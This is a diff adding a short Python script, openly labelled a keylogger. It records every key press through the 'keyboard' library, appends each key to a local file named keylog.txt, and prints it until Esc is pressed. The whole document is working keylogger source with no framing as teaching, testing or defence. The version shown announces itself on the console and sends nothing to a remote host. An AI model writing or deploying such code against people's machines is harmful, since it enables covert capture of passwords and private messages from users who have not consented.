@@ -1,0 +1,22 @@
+import keyboard
+
+def log_keys(filename):
+    try:
+        with open(filename, 'a') as f:
+            print(f"Logging keystrokes to {filename}")
+            while True:
+                event = keyboard.read_event()
+                if event.event_type == keyboard.KEY_DOWN:
+                    key = event.name
+                    if key == "esc":
+                        print("Exiting keylogger")
+                        break
+                    f.write(key + "\n")
+                    f.flush()  # Ensure the keystroke is written to the file immediately
+                    print(key)
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+if __name__ == "__main__":
+    filename = "keylog.txt"
+    log_keys(filename)
